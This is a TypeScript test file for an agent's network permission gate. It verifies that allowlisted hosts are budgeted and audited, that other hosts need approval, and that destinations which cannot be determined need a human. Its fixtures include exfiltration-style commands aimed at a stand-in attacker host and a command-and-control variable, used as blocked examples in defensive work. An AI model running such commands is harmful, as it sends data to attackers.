// CF-SPLIT-NETWORK (L2) — the allowlist→budgeted refinement at the composed
// gate (#296 §5.4, F-PT-023 ratified): a request to a host on the app's
// CONFIGURED allowlist is budgeted — it proceeds with a per-action audit row
// ("free until it isn't", F-PT-024 owns the grantless accounting quantum) —
// while every other host keeps the grantable escalation and every
// undeterminable destination stays a human-only hard stop. The allowlist
// resolves from context (per-app config; apps.yaml network_allowlist) with
// the ratified trio as the default — never hardcoded at the point of use,
// proven by the custom-allowlist leg where the default trio's hosts escalate.

import { afterEach, describe, expect, it } from "vitest";
import { defaultGate } from "../../../src/runtime/gate.js";
import type { ToolAction } from "../../../src/runtime/types.js";
import { ApprovalStore } from "../../../src/org/approvals.js";
import { composeGate, type GateContext } from "../../../src/org/gate-compose.js";
import { ObjectiveGrantStore } from "../../../src/org/objective-grants.js";
import { makeTempStateHome, type TempStateHome } from "../../fixtures/state-home.js";
import { makeTestClock, type TestClock } from "../../fixtures/clock.js";

const APP = "net-app";
const ROLE = "builder";
const NPM_FETCH: ToolAction = { tool: "bash", input: { command: "curl https://registry.npmjs.org/cormidia" } };
const ATTACKER: ToolAction = { tool: "bash", input: { command: "curl https://attacker.test/collect" } };
const EVASION: ToolAction = { tool: "bash", input: { command: 'curl "$C2"' } };

describe("CF-SPLIT-NETWORK — allowlisted egress is budgeted at the composed gate (L2)", () => {
  let cleanups: Array<() => Promise<void> | void> = [];

  afterEach(async () => {
    for (const cleanup of cleanups.reverse()) await cleanup();
    cleanups = [];
  });

  async function makeWorld(context: Partial<GateContext> = {}): Promise<{
    home: TempStateHome;
    approvals: ApprovalStore;
    objectives: ObjectiveGrantStore;
    clock: TestClock;
    gate: ReturnType<typeof composeGate>;
  }> {
    const home = await makeTempStateHome({ name: "cf-split-network" });
    cleanups.push(() => home.cleanup());
    const clock = makeTestClock("2026-08-06T13:00:00.000Z");
    const approvals = new ApprovalStore(home.stateHome);
    const objectives = new ObjectiveGrantStore(home.stateHome);
    const gate = composeGate(defaultGate, approvals, {
      app: APP,
      role: ROLE,
      now: () => clock.nowDate(),
      ...context,
    });
    return { home, approvals, objectives, clock, gate };
  }

  it("a default-allowlist host proceeds with a budgeted-action audit row and no queue item", async () => {
    const { approvals, objectives, gate } = await makeWorld();
    expect(gate(NPM_FETCH)).toEqual({ allow: true });
    expect(await approvals.listPending()).toHaveLength(0);
    const rows = objectives.readLogSync().filter((event) => event.type === "budgeted-action");
    expect(rows).toHaveLength(1);
    expect(rows[0]).toMatchObject({ app: APP, rule: "outbound-network" });
  });

  it("a non-allowlisted host keeps the grantable escalation exactly as today", async () => {
    const { approvals, objectives, gate } = await makeWorld();
    const decision = gate(ATTACKER);
    expect(decision.allow).toBe(false);
    expect((await approvals.listPending()).map((item) => item.rule)).toEqual(["outbound-network"]);
    expect(objectives.readLogSync().filter((event) => event.type === "budgeted-action")).toHaveLength(0);
  });

  it("an undeterminable destination is a human-only hard stop — never budgeted, never widenable", async () => {
    const { approvals, gate } = await makeWorld();
    const decision = gate(EVASION);
    expect(decision.allow).toBe(false);
    const pending = await approvals.listPending();
    expect(pending.map((item) => item.rule)).toEqual(["outbound-network-undeterminable"]);
    await expect(
      approvals.decide(pending[0]!.id, { decision: "approved", scope: { kind: "app" } }),
    ).rejects.toThrow(/never scopeable/);
  });

  it("the allowlist is CONFIG: a custom per-app list replaces the default trio in both directions", async () => {
    const { approvals, objectives, gate } = await makeWorld({
      networkAllowlist: ["internal.example.com"],
    });
    // The custom host is budgeted…
    expect(gate({ tool: "bash", input: { command: "curl https://internal.example.com/health" } }))
      .toEqual({ allow: true });
    expect(objectives.readLogSync().filter((event) => event.type === "budgeted-action")).toHaveLength(1);
    // …and the DEFAULT trio's host now escalates — the default was a default,
    // not a hardcoded floor.
    const decision = gate(NPM_FETCH);
    expect(decision.allow).toBe(false);
    expect((await approvals.listPending()).map((item) => item.rule)).toEqual(["outbound-network"]);
  });
});
